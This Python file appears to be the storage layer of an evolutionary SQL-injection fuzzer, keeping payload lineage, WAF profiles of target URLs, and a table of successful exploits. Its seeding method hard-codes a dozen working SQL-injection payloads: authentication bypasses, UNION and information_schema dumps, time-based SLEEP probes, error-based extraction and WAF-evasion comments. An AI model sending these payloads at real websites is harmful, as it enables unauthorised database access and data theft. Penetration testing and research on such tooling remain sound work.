import sqlite3
import os

class ExperienceManager:
    def __init__(self, db_path="memory.db"):
        self.db_path = db_path
        self._init_db()

    def _init_db(self):
        try:
            conn = sqlite3.connect(self.db_path)
            conn.execute('PRAGMA journal_mode = WAL') # Enable WAL mode
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS experience (
                    payload TEXT PRIMARY KEY,
                    score REAL,
                    status TEXT,
                    parent_payload TEXT,
                    island_id INTEGER DEFAULT 1,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            # Migration: Ensure island_id exists
            try:
                cursor.execute('SELECT island_id FROM experience LIMIT 1')
            except sqlite3.OperationalError:
                cursor.execute('ALTER TABLE experience ADD COLUMN island_id INTEGER DEFAULT 1')
                conn.commit()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS exploits (
                    payload TEXT PRIMARY KEY,
                    type TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS hints (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    strategy TEXT,
                    target_keyword TEXT,
                    suggestion TEXT,
                    consumed INTEGER DEFAULT 0,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS blocking_rules (
                    pattern TEXT PRIMARY KEY, 
                    confidence REAL
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS session_state (
                    target_url TEXT PRIMARY KEY,
                    state_json TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS target_profiles (
                    target_url TEXT PRIMARY KEY,
                    waf_name TEXT,
                    db_type TEXT,
                    blocked_chars TEXT,
                    successful_recipes TEXT,
                    avg_latency REAL,
                    last_updated DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS reputation_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    generation INTEGER,
                    keyword TEXT,
                    reputation REAL,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS last_session (
                    id INTEGER PRIMARY KEY CHECK (id = 1),
                    target_url TEXT,
                    last_updated DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            conn.commit()
            conn.close()
            self._seed_knowledge() # Seed real-world patterns
        except Exception as e:
            print(f"[!] Error initializing database: {e}")

    def save_target_profile(self, target_url, waf_name="UNKNOWN", db_type="GENERIC"):
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO target_profiles (target_url, waf_name, db_type, last_updated)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
                ON CONFLICT(target_url) DO UPDATE SET
                    waf_name = excluded.waf_name,
                    db_type = excluded.db_type,
                    last_updated = CURRENT_TIMESTAMP
            ''', (target_url, waf_name, db_type))
            
            # Update last session
            cursor.execute('INSERT OR REPLACE INTO last_session (id, target_url) VALUES (1, ?)', (target_url,))
            
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[!] Database Error (Save Profile): {e}")

    def save_session_state(self, target_url, state_json):
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO session_state (target_url, state_json, timestamp)
                VALUES (?, ?, CURRENT_TIMESTAMP)
            ''', (target_url, state_json))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[!] Database Error (Save State): {e}")

    def load_session_state(self, target_url):
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('SELECT state_json FROM session_state WHERE target_url = ?', (target_url,))
            result = cursor.fetchone()
            conn.close()
            return result[0] if result else None
        except Exception as e:
            print(f"[!] Database Error (Load State): {e}")
            return None

    def get_lineage(self, limit=50):
        """Retrieves parent-child relationships for visualization."""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                SELECT payload, parent_payload, score, status 
                FROM experience 
                WHERE parent_payload IS NOT NULL 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            results = cursor.fetchall()
            conn.close()
            return [{"payload": r[0], "parent": r[1], "score": r[2], "status": r[3]} for r in results]
        except Exception as e:
            print(f"[!] Database Error (Lineage): {e}")
            return []

    def _seed_knowledge(self):
        """Seeds the database with real-world attack patterns."""
        payloads = [
            ("admin--", "REAL_WORLD_AUTH"),
            ("1 OR 1=1", "REAL_WORLD_AUTH"),
            ("1 UNION SELECT NULL,NULL,NULL--", "REAL_WORLD_UNION"),
            ("-1 UNION SELECT 1,database(),user()--", "REAL_WORLD_UNION"),
            ("1 AND SLEEP(5)--", "REAL_WORLD_TIME"),
            ("1/*!50000OR*/1=1", "REAL_WORLD_WAF"),
            ("1 AND extractvalue(1,concat(0x7e,(select database())))--", "REAL_WORLD_ERROR"),
            ("admin #", "REAL_WORLD_AUTH"),
            ("1 OR 1=1--", "REAL_WORLD_AUTH"),
            ("1 UNION SELECT NULL,table_name FROM information_schema.tables--", "REAL_WORLD_SCHEMA"),
            ("1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,database(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "REAL_WORLD_ERROR"),
            ("SLEEP(5) /* or SLEEP(5) or \"*/", "REAL_WORLD_POLYGLOT")
        ]
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            for p, t in payloads:
                cursor.execute('''
                    INSERT OR IGNORE INTO experience (payload, score, status)
                    VALUES (?, ?, ?)
                ''', (p, 0.85, t))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[!] Error seeding knowledge: {e}")

    def save_hint(self, strategy, target_keyword, suggestion):
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO hints (strategy, target_keyword, suggestion)
                VALUES (?, ?, ?)
            ''', (strategy, target_keyword, suggestion))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[!] Database Error (Save Hint): {e}")

    def get_latest_hint(self):
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                SELECT id, strategy, target_keyword, suggestion FROM hints 
                WHERE consumed = 0 
                ORDER BY timestamp DESC LIMIT 1
            ''')
            result = cursor.fetchone()
            if result:
                # Mark as consumed
                cursor.execute('UPDATE hints SET consumed = 1 WHERE id = ?', (result[0],))
                conn.commit()
                conn.close()
                return {
                    "strategy": result[1],
                    "target_keyword": result[2],
                    "suggestion": result[3]
                }
            conn.close()
            return None
        except Exception as e:
            print(f"[!] Database Error (Get Hint): {e}")
            return None

    def save_attempt(self, payload, score, status, parent_payload=None, island_id=1):
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO experience (payload, score, status, parent_payload, island_id)
                VALUES (?, ?, ?, ?, ?)
            ''', (payload, score, status, parent_payload, island_id))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[!] Database Error (Save): {e}")

    def save_exploit(self, payload, exploit_type):
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT OR IGNORE INTO exploits (payload, type)
                VALUES (?, ?)
            ''', (payload, exploit_type))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[!] Database Error (Exploit): {e}")

    def get_all_exploits(self):
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('SELECT payload, type FROM exploits ORDER BY timestamp DESC')
            results = cursor.fetchall()
            conn.close()
            return results
        except Exception as e:
            print(f"[!] Database Error (Get Exploits): {e}")
            return []

    def get_golden_payloads(self, limit=5):
        """Retrieves the most successful payloads from previous sessions."""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                SELECT payload FROM experience 
                WHERE score >= 0.8 
                ORDER BY score DESC, timestamp DESC 
                LIMIT ?
            ''', (limit,))
            results = cursor.fetchall()
            conn.close()
            return [r[0] for r in results]
        except Exception as e:
            print(f"[!] Database Error (Golden): {e}")
            return []

    def save_reputation_history(self, gen_num, reputation_map):
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            for kw, val in reputation_map.items():
                cursor.execute('''
                    INSERT INTO reputation_history (generation, keyword, reputation)
                    VALUES (?, ?, ?)
                ''', (gen_num, kw, val))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[!] Database Error (Reputation History): {e}")

    def get_payload_lineage(self, final_payload):
        """Recursively traces the lineage of a payload back to its seed."""
        lineage = []
        current = final_payload
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            while current:
                cursor.execute('SELECT payload, parent_payload, score, status, timestamp FROM experience WHERE payload = ?', (current,))
                row = cursor.fetchone()
                if not row: break
                
                lineage.append({
                    "payload": row[0],
                    "parent": row[1],
                    "score": row[2],
                    "status": row[3],
                    "timestamp": row[4]
                })
                current = row[1] # Move to parent
                if len(lineage) > 50: break # Safety break
                
            conn.close()
            return list(reversed(lineage))
        except Exception as e:
            print(f"[!] Database Error (Lineage Retrieval): {e}")
            return []

    def get_reputation_trends(self, limit_gens=30):
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                SELECT generation, keyword, reputation 
                FROM reputation_history 
                WHERE generation <= ?
                ORDER BY generation ASC, keyword ASC
            ''', (limit_gens,))
            results = cursor.fetchall()
            conn.close()
            
            # Pivot data for charting
            trends = {}
            for gen, kw, rep in results:
                if gen not in trends: trends[gen] = {"generation": gen}
                trends[gen][kw] = rep
            return list(trends.values())
        except Exception as e:
            print(f"[!] Database Error (Reputation Trends): {e}")
            return []
